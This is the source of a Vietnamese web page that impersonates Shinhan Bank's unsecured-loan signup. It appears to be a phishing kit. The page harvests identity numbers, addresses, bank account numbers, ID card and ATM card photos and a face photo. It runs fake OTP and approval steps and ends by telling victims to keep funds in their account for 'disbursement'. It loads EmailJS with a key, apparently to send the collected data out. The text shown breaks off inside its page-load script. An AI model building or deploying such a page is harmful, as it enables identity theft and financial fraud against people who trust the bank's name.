<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font chữ hiện đại (Roboto) -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <!-- EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f7fa;
        }
        .header {
            background-color: #003087;
            color: white;
            padding: 20px;
            text-align: center;
            border-bottom: 5px solid #00205B;
        }
        .header img {
            max-width: 200px;
            height: auto;
            transition: transform 0.3s;
        }
        .header img:hover {
            transform: scale(1.05);
        }
        .container {
            max-width: 900px;
            margin: 30px auto;
            padding: 30px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.5s ease-in;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            max-width: 150px;
            height: auto;
            transition: transform 0.3s;
        }
        .form-logo img:hover {
            transform: scale(1.05);
        }
        .form-label {
            font-weight: 500;
            color: #333;
        }
        .form-control, .form-select {
            border-radius: 5px;
            border: 1px solid #ced4da;
            padding: 10px;
            font-size: 16px;
        }
        .form-control:focus, .form-select:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .file-upload-box {
            border: 1px dashed #ced4da;
            border-radius: 5px;
            padding: 15px;
            text-align: center;
            margin-bottom: 10px;
        }
        .file-upload-box input {
            display: none;
        }
        .file-upload-box label {
            cursor: pointer;
            color: #003087;
            font-weight: 500;
        }
        .file-info {
            font-size: 14px;
            color: #666;
            margin-top: 5px;
        }
        .preview-section {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .preview-section img {
            max-width: 150px;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
        }
        .btn-primary {
            background-color: #003087;
            border-color: #003087;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-primary:hover {
            background-color: #00205B;
            border-color: #00205B;
        }
        .btn-primary:disabled {
            background-color: #6c757d;
            border-color: #6c757d;
            cursor: not-allowed;
        }
        .btn-messenger {
            background-color: #0084FF;
            border-color: #0084FF;
            color: white;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-messenger:hover {
            background-color: #006DD9;
            border-color: #006DD9;
        }
        .btn-copy {
            background-color: #28a745;
            border-color: #28a745;
            color: white;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-copy:hover {
            background-color: #218838;
            border-color: #218838;
        }
        .otp-display {
            background-color: #e7f3ff;
            border: 1px solid #b8daff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        .otp-display p {
            margin: 0;
            font-size: 18px;
            font-weight: 700;
            color: #003087;
        }
        .otp-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .otp-input input {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ced4da;
            border-radius: 5px;
        }
        .otp-input input:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .image-section canvas {
            width: 100%;
            max-width: 360px;
            margin: 20px auto;
            display: block;
            border: 2px solid #e9ecef;
            border-radius: 8px;
        }
        .hidden {
            display: none;
        }
        .modal-content {
            border: none;
            border-radius: 10px;
        }
        .modal-header {
            background-color: #003087;
            color: white;
            border-bottom: none;
            padding: 20px;
            display: flex;
            align-items: center;
        }
        .modal-body {
            text-align: center;
            padding: 30px;
        }
        .modal-body h5 {
            color: #003087;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .modal-body p {
            color: #555;
            font-size: 16px;
        }
        .modal-footer {
            border-top: none;
            padding: 20px;
            justify-content: center;
        }
        .step-title {
            color: #003087;
            font-weight: 700;
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
        }
        .step-description {
            color: #666;
            font-size: 16px;
            text-align: center;
            margin-bottom: 30px;
        }
        .spinner-border {
            width: 3rem;
            height: 3rem;
            border-width: 0.4em;
        }
        .info-box {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }
        .info-box p {
            margin: 0;
            color: #333;
            font-size: 16px;
        }
        .confirmation-box {
            background-color: #e7f3ff;
            border: 1px solid #b8daff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .confirmation-box p {
            margin: 0;
            color: #003087;
            font-size: 16px;
            font-weight: 500;
        }
        .terms-box {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .terms-box img {
            width: 28px;
            height: 28px;
        }
        .terms-box p {
            margin: 0;
            color: #666;
            font-size: 14px;
        }
        .footer {
            background-color: #003087;
            color: white;
            padding: 20px;
            text-align: center;
            margin-top: 30px;
            border-top: 5px solid #00205B;
        }
        .footer p {
            margin: 0;
            font-size: 14px;
        }
        .footer img.lock-icon {
            width: 24px;
            vertical-align: middle;
            margin-right: 5px;
        }
        .footer img.footer-logo {
            max-width: 130px;
            height: auto;
            transition: transform 0.3s;
        }
        .footer img.footer-logo:hover {
            transform: scale(1.05);
        }
        .modal-header img {
            width: 30px;
            margin-right: 10px;
        }
        .step10-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .step10-logo img {
            max-width: 150px;
            height: auto;
            transition: transform 0.3s;
        }
        .step10-logo img:hover {
            transform: scale(1.05);
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1055;
        }
        .progress-bar-container {
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 10px;
            background-color: #e9ecef;
            border-radius: 5px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background-color: #003087;
            transition: width 0.3s ease-in-out;
        }
        .celebration-gif {
            max-width: 200px;
            margin: 20px auto;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @media (max-width: 576px) {
            .otp-input input {
                width: 35px;
                height: 35px;
                font-size: 16px;
            }
            .container {
                padding: 15px;
            }
            .header img {
                max-width: 150px;
            }
            .form-logo img, .step10-logo img {
                max-width: 120px;
            }
            .footer img.footer-logo {
                max-width: 100px;
            }
            .preview-section img {
                max-width: 100px;
            }
            .celebration-gif {
                max-width: 150px;
            }
        }
    </style>
</head>
<body>
    <!-- Toast Container -->
    <div class="toast-container">
        <div id="emailToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-autohide="true" data-bs-delay="5000">
            <div class="toast-header">
                <strong class="me-auto">Thông báo</strong>
                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body"></div>
        </div>
    </div>

    <!-- Header -->
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/200x50?text=Logo+Shinhan'">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <!-- Main Content -->
    <div class="container">
        <!-- Progress Bar -->
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
        </div>

        <!-- Bước 1: Đăng ký hồ sơ -->
        <div id="step1">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
            <p class="step-description">Vui lòng cung cấp thông tin cá nhân để chúng tôi tiến hành xét duyệt.</p>
            <form id="registerForm">
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên</label>
                    <input type="text" class="form-control" id="fullName" placeholder="Nhập họ và tên" required>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD</label>
                    <input type="text" class="form-control" id="idNumber" placeholder="Nhập số CMND/CCCD" required>
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD</label>
                    <input type="text" class="form-control" id="idIssueDate" placeholder="Nhập ngày cấp (DD/MM/YYYY)" required>
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD</label>
                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Nhập nơi cấp" required>
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ Thường Trú</label>
                    <input type="text" class="form-control" id="address" placeholder="Nhập địa chỉ thường trú" required>
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
                    <select class="form-select" id="occupation" required>
                        <option value="" disabled selected>Chọn nghề nghiệp</option>
                        <option value="nhanvien">Nhân viên văn phòng</option>
                        <option value="kinhdoanh">Kinh doanh tự do</option>
                        <option value="giaovien">Giáo viên</option>
                        <option value="congnhan">Công nhân</option>
                        <option value="kysu">Kỹ sư</option>
                        <option value="bacsi">Bác sĩ</option>
                        <option value="banhang">Nhân viên bán hàng</option>
                        <option value="laixe">Lái xe</option>
                        <option value="noitro">Nội trợ</option>
                        <option value="sinhvien">Sinh viên</option>
                        <option value="khac">Khác</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND)</label>
                    <input type="text" class="form-control" id="income" placeholder="Nhập thu nhập hàng tháng" required>
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại</label>
                    <input type="tel" class="form-control" id="phoneNumber" placeholder="Nhập số điện thoại" required>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="email" class="form-control" id="email" placeholder="Nhập email" required>
                </div>
                <div class="mb-3">
                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND)</label>
                    <select class="form-select" id="loanAmount" required>
                        <option value="" disabled selected>Chọn số tiền vay</option>
                        <option value="10000000">10,000,000</option>
                        <option value="15000000">15,000,000</option>
                        <option value="25000000">25,000,000</option>
                        <option value="50000000">50,000,000</option>
                        <option value="100000000">100,000,000</option>
                        <option value="200000000">200,000,000</option>
                        <option value="300000000">300,000,000</option>
                        <option value="400000000">400,000,000</option>
                        <option value="500000000">500,000,000</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Số Tháng Vay</label>
                    <select class="form-select" id="loanTerm" required>
                        <option value="" disabled selected>Chọn số tháng vay</option>
                        <option value="6">6 tháng</option>
                        <option value="12">12 tháng</option>
                        <option value="18">18 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                        <option value="48">48 tháng</option>
                        <option value="60">60 tháng</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
                    <select class="form-select" id="loanPurpose" required>
                        <option value="" disabled selected>Chọn mục đích vay</option>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                        <option value="Mua xe">Mua xe</option>
                        <option value="Học tập">Học tập</option>
                        <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                        <option value="Khác">Khác</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng</label>
                    <input type="text" class="form-control" id="accountNumber" placeholder="Nhập số tài khoản ngân hàng" required pattern="[0-9]+">
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng</label>
                    <input type="text" class="form-control" id="bankName" placeholder="Nhập tên ngân hàng" required>
                </div>
                <div class="mb-3">
                    <div class="terms-box">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock'">
                        <p>Thông tin của bạn sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank. Vui lòng đọc kỹ <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="termsAgree">
                        <label class="form-check-label" for="termsAgree">
                            Tôi đồng ý với các điều khoản và điều kiện của Shinhan Bank.
                        </label>
                    </div>
                </div>
                <!-- Preview Section for Profile and Contract Images -->
                <div class="preview-section" id="previewSection">
                    <h6>Xem trước hình ảnh</h6>
                    <div id="profileImagePreview">
                        <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                    </div>
                    <div id="contractImagePreview">
                        <p>Hình ảnh hợp đồng: Chưa có</p>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary w-100">Tiếp Tục</button>
            </form>
        </div>

        <!-- Bước 2: Tải lên giấy tờ (CMND/CCCD) -->
        <div id="step2" class="hidden">
            <h5 class="step-title">Tải Lên Giấy Tờ (CMND/CCCD)</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh CMND/CCCD để hoàn tất hồ sơ đăng ký.</p>
            <div class="mb-3">
                <label for="idFrontImage" class="form-label">Hình Ảnh CMND/CCCD (Mặt Trước)</label>
                <div class="file-upload-box">
                    <label for="idFrontImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="idFrontImage" accept="image/jpeg,image/png" required>
                    <div class="file-info" id="idFrontInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng tải lên hình ảnh mặt trước CMND/CCCD (JPEG/PNG, tối đa 5MB).</div>
            </div>
            <div class="mb-3">
                <label for="idBackImage" class="form-label">Hình Ảnh CMND/CCCD (Mặt Sau)</label>
                <div class="file-upload-box">
                    <label for="idBackImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="idBackImage" accept="image/jpeg,image/png" required>
                    <div class="file-info" id="idBackInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng tải lên hình ảnh mặt sau CMND/CCCD (JPEG/PNG, tối đa 5MB).</div>
            </div>
            <div class="text-center mt-3">
                <button id="proceedToStep3Btn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 3: Tải lên thẻ ATM -->
        <div id="step3" class="hidden">
            <h5 class="step-title">Tải Lên Thẻ ATM</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh thẻ ATM để hoàn tất hồ sơ đăng ký.</p>
            <div class="mb-3">
                <label for="atmImage" class="form-label">Hình Ảnh Thẻ ATM</label>
                <div class="file-upload-box">
                    <label for="atmImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="atmImage" accept="image/jpeg,image/png" required>
                    <div class="file-info" id="atmImageInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng tải lên hình ảnh thẻ ATM (JPEG/PNG, tối đa 5MB).</div>
            </div>
            <div class="text-center mt-3">
                <button id="proceedToStep4Btn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 4: Chụp khuôn mặt -->
        <div id="step4" class="hidden">
            <h5 class="step-title">Xác Minh Khuôn Mặt</h5>
            <p class="step-description">Vui lòng chụp ảnh khuôn mặt hoặc tải lên hình ảnh để xác minh danh tính.</p>
            <div class="mb-3">
                <label for="faceImage" class="form-label">Hình Ảnh Khuôn Mặt</label>
                <div class="file-upload-box">
                    <label for="faceImage">Chụp ảnh hoặc chọn tệp</label>
                    <input type="file" id="faceImage" accept="image/jpeg,image/png" capture="user" required>
                    <div class="file-info" id="faceImageInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng chụp hoặc tải lên hình ảnh khuôn mặt (JPEG/PNG, tối đa 5MB).</div>
            </div>
            <div class="text-center mt-3">
                <button id="proceedToOtpBtn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 5: Xác nhận danh tính bằng OTP -->
        <div id="step5" class="hidden">
            <h5 class="step-title">Xác Nhận Danh Tính</h5>
            <p class="step-description">Vui lòng nhập mã OTP được hiển thị để xác minh danh tính.</p>
            <div class="otp-display">
                <p id="otpDisplay">------</p>
                <button type="button" class="btn btn-copy" onclick="copyOtp()">Sao Chép</button>
            </div>
            <div class="otp-input">
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp1" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp2" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp3" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp4" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp5" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp6" required>
            </div>
            <div class="text-center">
                <button id="verifyOtpBtn" class="btn btn-primary">Xác Nhận OTP</button>
            </div>
        </div>

        <!-- Bước 6: Quá trình xét duyệt -->
        <div id="step6" class="hidden">
            <h5 class="step-title">Đang Xét Duyệt Hồ Sơ</h5>
            <p class="step-description">Hệ thống đang xử lý hồ sơ của bạn. Vui lòng chờ trong giây lát.</p>
            <div class="text-center">
                <div class="spinner-border text-primary" role="status">
                    <span class="visually-hidden">Đang tải...</span>
                </div>
            </div>
        </div>

        <!-- Bước 7: Thông báo duyệt hồ sơ -->
        <div id="step7" class="hidden">
            <h5 class="step-title">Hồ Sơ Được Duyệt</h5>
            <p class="step-description">Chúc mừng! Hồ sơ vay tín chấp của bạn đã được duyệt.</p>
            <div class="confirmation-box">
                <p id="confirmationMessage"></p>
                <p>Thông tin chi tiết đã được gửi đến email: <span id="confirmationEmail"></span></p>
            </div>
            <div class="text-center">
                <button id="proceedToContractBtn" class="btn btn-primary">Xem Hợp Đồng</button>
            </div>
        </div>

        <!-- Bước 8: Hiển thị hợp đồng -->
        <div id="step8" class="hidden">
            <h5 class="step-title">Xem Hợp Đồng</h5>
            <p class="step-description">Dưới đây là hợp đồng vay tín chấp của bạn. Vui lòng kiểm tra kỹ thông tin.</p>
            <div class="image-section">
                <canvas id="contractCanvas"></canvas>
            </div>
            <div class="text-center">
                <button id="proceedToSignContractBtn" class="btn btn-primary">Ký Hợp Đồng</button>
            </div>
        </div>

        <!-- Bước 8.1: Ký hợp đồng bằng OTP -->
        <div id="step8-1" class="hidden">
            <h5 class="step-title">Ký Hợp Đồng</h5>
            <p class="step-description">Vui lòng nhập mã OTP để xác nhận ký hợp đồng.</p>
            <div class="otp-display">
                <p id="signOtpDisplay">------</p>
                <button type="button" class="btn btn-copy" onclick="copySignOtp()">Sao Chép</button>
            </div>
            <div class="otp-input">
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp1" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp2" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp3" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp4" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp5" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp6" required>
            </div>
            <div class="text-center">
                <button id="verifySignOtpBtn" class="btn btn-primary">Xác Nhận OTP</button>
            </div>
        </div>

        <!-- Bước 9: Điều kiện giải ngân -->
        <div id="step9" class="hidden">
            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
            <p class="step-description">Vui lòng xem các điều kiện giải ngân dưới đây.</p>
            <div class="image-section">
                <canvas id="disbursementCanvas"></canvas>
            </div>
            <div class="text-center">
                <button id="proceedToFinalStepBtn" class="btn btn-primary">Hoàn Tất</button>
            </div>
        </div>

        <!-- Bước 10: Hoàn tất -->
        <div id="step10" class="hidden">
            <div class="step10-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hoàn Tất Đăng Ký</h5>
            <p class="step-description">Cảm ơn bạn đã đăng ký vay tín chấp tại Shinhan Bank. Vui lòng thực hiện các bước tiếp theo để nhận khoản vay.</p>
            <div class="info-box">
                <p>Vui lòng duy trì số dư tài khoản để đảm bảo giải ngân thành công. Nếu có thắc mắc, hãy liên hệ với chúng tôi qua Messenger.</p>
            </div>
            <div class="text-center">
                <a href="https://m.me/ShinhanBankVietnam" target="_blank" class="btn btn-messenger">Liên Hệ Messenger</a>
            </div>
        </div>

        <!-- Modal Điều khoản -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/30x30?text=Lock'">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <h5>Chính Sách Bảo Mật</h5>
                        <p>Shinhan Bank cam kết bảo mật thông tin cá nhân của bạn theo quy định pháp luật Việt Nam. Thông tin của bạn sẽ chỉ được sử dụng để xử lý hồ sơ vay và sẽ không được chia sẻ với bên thứ ba mà không có sự đồng ý của bạn.</p>
                        <h5>Điều Kiện Vay</h5>
                        <p>- Độ tuổi: Từ 20 đến 60 tuổi.<br>
                           - Thu nhập tối thiểu: 5,000,000 VND/tháng.<br>
                           - Không có nợ xấu tại thời điểm đăng ký.</p>
                        <h5>Trách Nhiệm của Khách Hàng</h5>
                        <p>Khách hàng cần cung cấp thông tin chính xác và chịu trách nhiệm về tính xác thực của các tài liệu cung cấp.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal thông báo duyệt -->
        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="successModalLabel">Chúc Mừng!</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Hồ sơ vay tín chấp của bạn đã được duyệt thành công!</p>
                        <p id="modalFullName"></p>
                        <p id="modalLoanAmount"></p>
                        <p id="modalLoanCode"></p>
                        <p>Thông tin chi tiết đã được gửi đến email của bạn.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToContract()">Tiếp Tục</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal chúc mừng với ảnh động -->
        <div class="modal fade" id="celebrationModal" tabindex="-1" aria-labelledby="celebrationModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="celebrationModalLabel">Chúc Mừng!</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <img src="https://media.giphy.com/media/3o6Zta4x8M5a1zF7yM/giphy.gif" alt="Celebration GIF" class="celebration-gif" onerror="this.src='https://via.placeholder.com/200x200?text=Celebration'">
                        <p id="celebrationMessage"></p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToStep(6, 7, 70)">Tiếp Tục</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock'">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: support@shinhan.com.vn</p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/130x50?text=Logo+Shinhan'">
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Script xử lý form và gửi email -->
    <script>
        // Khởi tạo EmailJS với public key
        (function() {
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        // Hàm hiển thị toast
        function showToast(message, isSuccess = true) {
            try {
                const toast = document.getElementById('emailToast');
                const toastBody = toast.querySelector('.toast-body');
                toastBody.textContent = message;
                toast.classList.remove('bg-success', 'bg-danger');
                toast.classList.add(isSuccess ? 'bg-success' : 'bg-danger');
                const bsToast = new bootstrap.Toast(toast);
                bsToast.show();
            } catch (error) {
                console.error("Lỗi hiển thị toast:", error);
            }
        }

        // Định nghĩa formData với URL hình ảnh và fallback
        let formData = {
            contractImage: "https://vaytieudung.github.io/shinhanbank/assets/img/contract_image.png",
            disbursementImage: "https://vaytieudung.github.io/shinhanbank/assets/img/disbursement_image.png",
            fallbackImage: "https://via.placeholder.com/360x509?text=Hinh+Anh+Mac+Dinh",
            fallbackProfileImage: "https://via.placeholder.com/150x150?text=Anh+Ho+So"
        };

        // Dữ liệu người đăng ký
        let userData = {};

        // Quản lý mã ngẫu nhiên đã sử dụng
        let usedCodes = JSON.parse(localStorage.getItem('usedCodes')) || new Set();

        // Hàm lưu dữ liệu vào localStorage
        function saveToLocalStorage(step) {
            try {
                userData.currentStep = step;
                localStorage.setItem('userData', JSON.stringify(userData));
                localStorage.setItem('usedCodes', JSON.stringify([...usedCodes]));
            } catch (error) {
                console.error("Lỗi lưu localStorage:", error);
                showToast("Lỗi lưu dữ liệu. Vui lòng thử lại!", false);
            }
        }

        // Hàm cập nhật preview section
        function updatePreviewSection() {
            try {
                if (userData.currentStep >= 4 && userData.faceImageUrl) {
                    $('#profileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                } else {
                    $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                }
                if (userData.currentStep >= 8 && userData.contractImageUrl) {
                    $('#contractImagePreview').html(`<img src="${userData.contractImageUrl}" alt="Hình ảnh hợp đồng" />`);
                } else {
                    $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
                }
            } catch (error) {
                console.error("Lỗi cập nhật preview section:", error);
                $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
            }
        }

        // Hàm chuyển bước
        function proceedToStep(currentStep, nextStep, progress) {
            try {
                // Validate required fields before proceeding
                const requiredFields = ['fullName', 'idNumber', 'idIssueDate', 'idIssuePlace', 'address', 'occupation', 'income', 'phoneNumber', 'email', 'loanAmount', 'loanTerm', 'loanPurpose', 'accountNumber', 'bankName', 'loanCode', 'registrationDate'];
                if (nextStep > 1 && !requiredFields.every(field => userData[field] && userData[field] !== 'Không Cung Cấp')) {
                    showToast("Dữ liệu không đầy đủ. Vui lòng kiểm tra lại!", false);
                    return;
                }
                $(`#step${currentStep}`).addClass('hidden');
                $(`#step${nextStep}`).removeClass('hidden');
                $('#progressBar').css('width', `${progress}%`);
                saveToLocalStorage(nextStep);
                updatePreviewSection();
            } catch (error) {
                console.error(`Lỗi chuyển từ bước ${currentStep} sang ${nextStep}:`, error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
                $(`#step${nextStep}`).addClass('hidden');
                $(`#step${currentStep}`).removeClass('hidden');
            }
        }

        // Khôi phục dữ liệu từ localStorage và chống spam
        window.onload = function() {
            try {
                const savedData = localStorage.getItem('userData');
                if (savedData) {
                    userData = JSON.parse(savedData);
                    if (userData.isRegistered && userData.loanCode) {
                        showToast("Hồ sơ đã có trên hệ thống. Vui lòng quay lại!", false);
                        $('#registerForm button[type="submit"]').prop('disabled', true);
                        if (userData.currentStep >= 10) {
                            proceedToStep(1, 10, 100);
                        } else if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    } else {
                        $('#fullName').val(userData.fullName || '');
                        $('#idNumber').val(userData.idNumber || '');
                        $('#idIssueDate').val(userData.idIssueDate || '');
                        $('#idIssuePlace').val(userData.idIssuePlace || '');
                        $('#address').val(userData.address || '');
                        $('#occupation').val(userData.occupation || '');
                        $('#income').val(userData.income ? Number(userData.income).toLocaleString('vi-VN') : '');
                        $('#phoneNumber').val(userData.phoneNumber || '');
                        $('#email').val(userData.email || '');
                        $('#loanAmount').val(userData.loanAmount || '');
                        $('#loanTerm').val(userData.loanTerm || '');
                        $('#loanPurpose').val(userData.loanPurpose || '');
